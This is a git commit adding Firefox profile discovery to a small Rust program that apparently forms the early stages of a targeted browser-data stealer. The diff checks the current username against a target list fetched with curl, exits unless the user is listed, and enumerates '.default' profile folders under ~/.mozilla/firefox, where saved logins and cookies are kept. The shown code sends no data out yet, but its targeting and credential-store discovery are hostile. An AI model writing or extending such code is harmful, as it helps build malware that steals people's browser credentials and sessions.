bc6cc12ea75b98674ffd8f97db4696fb9ebe29b3
0v3rl0w <dalcjor@libmail.eu>
2019-04-21 16:25:29 +0000

    Now it can find Firefox profiles

--- src/main.rs
+++ src/main.rs
@@ -1,23 +1,42 @@
-use std::process::Command;
+use std::fs;
+use std::process;
+use std::path::Path;
+use std::path::PathBuf;
 
 fn run_command(command : &str, argument : &str) -> String {
-    let output_utf8 = Command::new(command)
+    let output_utf8 = process::Command::new(command)
                       .arg(argument)
                       .output()
                       .expect("Failed to execute");
     String::from_utf8_lossy(&output_utf8.stdout).into_owned()
 }
 
+fn get_profile_path(firefox_path: PathBuf) -> Vec<String> {
+    let dirs           : fs::ReadDir = fs::read_dir(firefox_path).unwrap();
+    let mut profiles   : Vec<String> = Vec::new();
+    let mut line       : PathBuf;
+    let mut filepath   : String;
+
+    for dir in dirs {
+        line       = dir.unwrap().path();
+        filepath   = line.to_string_lossy().to_string();
+        if filepath.contains(".default") {
+            profiles.push(format!("{}", &filepath));
+        }
+    }
+
+    profiles
+}
 
 fn main() {
-    let username      : String    = run_command("id", "-un").replace("\n", "");
-    let targets       : String    = run_command("curl", "http://localhost/user.txt");
-    let targets_vec   : Vec<&str> = targets.lines().collect();
-    let mut in_target : bool      = false;
+    let username      : String      = run_command("id", "-un").replace("\n", "");
+    let targets       : String      = run_command("curl", "http://localhost/user.txt");
+    let firefox_path  : &PathBuf    = &[env!("HOME"), ".mozilla", "firefox"].iter().collect();
+    let profiles      : Vec<String> = get_profile_path(firefox_path.to_path_buf());
+    let targets_vec   : Vec<&str>   = targets.lines().collect();
+    let in_target     : bool        = targets_vec.contains(&&*username);
 
-    for target in targets_vec {
-        if username == target {
-            in_target = true;
-        }
+    if !in_target || !Path::new(firefox_path).exists() {
+        process::exit(1);
     }
 }
